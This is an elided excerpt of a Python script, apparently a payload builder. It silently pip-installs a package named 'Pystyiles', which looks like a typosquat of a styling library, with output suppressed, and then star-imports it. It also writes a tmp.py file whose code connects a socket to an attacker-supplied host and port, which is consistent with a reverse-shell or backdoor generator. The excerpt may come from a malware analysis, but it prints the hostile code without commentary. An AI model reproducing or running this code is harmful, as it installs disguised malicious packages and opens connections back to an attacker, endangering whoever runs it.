...
if platform.system().startswith("Linux"):
    ...
    try:
        ...
        os.system("python3 -m pip install Pystyiles -q -q -q")
        from Pystyiles import *
    try:
        import colorama
    except ImportError:
    ...
    try:
        ...
        os.system("python -m pip install Pystyiles -q -q -q")
        from Pystyiles import *
    try:
        import colorama
    except ImportError:
...
def enc():
    ...
    with open('tmp.py', 'w') as f:
        ...
        f.write(f"         s.connect(('{file}',{file1}))\n         break\n     except:\n")
    ...
    if path.is_file():
        ...
        try:
            ...
            print(termcolor.colored("[ X ] Error Occured",'red'))
catc()
